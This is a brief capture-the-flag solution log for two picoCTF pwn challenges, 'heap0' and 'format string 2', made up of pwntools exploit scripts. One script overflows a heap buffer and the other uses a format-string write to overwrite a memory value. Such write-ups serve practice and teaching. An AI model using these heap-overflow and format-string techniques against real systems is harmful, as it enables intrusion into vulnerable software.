# 【Pico】Pwn 系列解題紀錄

## heap0

```py
#!/usr/bin/env python3
from pwn import *

context.binary = './chall'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = 'tethys.picoctf.net'
    port = 49849
    p = remote(ip, port)
else:
    p = process()

p.sendline("2")

p.sendline(b"a"*50)

p.sendline(b"4")

p.interactive()
```

## format string 2

```py
#!/usr/bin/env python3
from pwn import *

context.binary = './vuln'
context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

if args.REMOTE:
    ip = 'rhea.picoctf.net'
    port = 63480
    p = remote(ip, port)
else:
    p = process()

def exec_fmt(payload):
    if args.REMOTE:
        p = remote(ip, port)
    else:
        p = process()
    p.sendline(payload)
    return p.recvall()    
    

fmt = FmtStr(exec_fmt)
offset = fmt.offset

payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)


p.interactive()
```
